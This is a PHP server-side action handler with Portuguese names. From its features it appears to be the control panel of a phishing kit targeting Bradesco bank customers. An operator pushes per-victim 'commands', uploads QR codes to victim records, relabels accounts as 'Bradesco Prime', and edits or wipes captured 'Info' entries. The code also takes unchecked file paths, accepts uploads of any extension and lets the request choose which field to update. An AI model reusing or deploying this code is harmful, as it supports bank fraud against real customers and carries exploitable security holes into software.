<?php
    require_once 'config.php';
    include 'validaLogin.php';

    if(isset($_GET["action"])){
        $action = $_GET["action"];

        if($action == "SAIR_SESSAO") {
            $id = $_GET["id"];
            Sessao::deletar($id);
            session_destroy();
            header('Location: ' . $_SERVER['HTTP_REFERER']);
        }

        if($action == "DELETAR_SESSAO") {
            $id = $_GET["id"];
            Sessao::deletar($id);
            header('Location: ' . $_SERVER['HTTP_REFERER']);
        }

        if($action == "ALTERAR_STATUS_ACESSO") {
            $id = $_GET["id"];
            $status = $_GET["status"];

            Acesso::alterarStatus($id, $status);

            header('Location: ' . $_SERVER['HTTP_REFERER']);
        }
        if($action == "APAGAR_ACESSO") {
            $id = $_GET["id"];
            Acesso::deletar($id);
            header('Location: ' . $_SERVER['HTTP_REFERER']);
        }

        
    }else if(isset($_POST["action"])){
        $action = $_POST["action"];

        if($action == "ANOTACAO") {
            $fileName = $_POST["fileName"];
            $anotacao = tiraQuebraDeLinha($_POST["anotacao"]);
            $conteudo = file_get_contents($fileName.".txt");
            $conteudo = preg_replace("#<anotacao>(?s).*<\/anotacao>#", "<anotacao>$anotacao</anotacao>", $conteudo);
            file_put_contents($fileName.".txt", $conteudo);
            echo "OK";
        }

        if($action == "BUSCAR_TODOS_COM_ACESSO") {

            echo json_encode(ListaInfoDTO::converterParaDTO(Info::buscarTodosComAcesso()));
            
        }
        if($action == "ALTERAR_INFO_ABERTO") {
            $id = $_POST["id"];
            $aberto = $_POST["aberto"];
            Info::alterarAberto($id, $aberto);
            Info::marcarComoVisualizada($id);
        }

        if($action == "MARCAR_COMO_VISUALIZADA") {
            $id = $_POST["id"];
            Info::marcarComoVisualizada($id);
        }
        
        if($action == "REMOVER_INFO") {
            $id = $_POST["id"];
            Info::deletar($id);
            echo "ok";
        }
        if($action == "ALTERAR_COMANDO") {
            $id = $_POST["id"];
            $comando = $_POST["comando"];
            Info::alterarComando($id, $comando);
            echo "ok";
        }

        if($action == "MUDAR_PARA_PRIME") {
            $id = $_POST["id"];
            Info::atualizarTipo($id, "Bradesco Prime");
            echo "ok";
        }

        
        
        if($action == "ALTERAR_COMANDO_COM_TEXTO") {
            $id = $_POST["id"];
            $comando = $_POST["comando"];
            $texto = $_POST["texto"];
            Info::alterarComandoComTexto($id, $comando, $texto);
            echo "ok";
        }

        if($action == "EXCLUIR_TODOS_ACESSOS") {
            Acesso::apagarTodos();
            echo "ok";
        }
        
        if($action == "EXCLUIR_TODOS_INFOS") {
            Info::apagarTodos();
            echo "ok";
        }
        if($action == "BUSCAR_POR_ID") {
            $id = $_POST['id'];
            echo json_encode(InfoDTO::converter(Info::findById($id)));
        }
        if($action == "UPLOAD_QR") {
            $id = $_POST["id"];
            $file = $_FILES['foto'];
            $path = $file['name'];
            $ext = pathinfo($path, PATHINFO_EXTENSION);

            $name_file =  md5(date('Y-m-d H:i:s:u')).".".$ext;
            Info::atualizarInformacoesSemHash($id, 'qrCodeFile', $name_file);
            Info::atualizarInformacoesSemHash($id, 'comando', 'QR_CODE_INTERNA');
            
            $dir = '../qrs/';
            move_uploaded_file($_FILES['foto']['tmp_name'], $dir.$name_file);
            echo "ok";
        }
        
        if($action == "ALTERAR_INFORMACOES") {
            $id = $_POST["id"];
            $valor = $_POST["valor"];
            $campo = $_POST["campo"];
            Info::atualizarInformacoesSemHash($id, $campo, $valor);
            echo "ok";
        }

    }
    
?>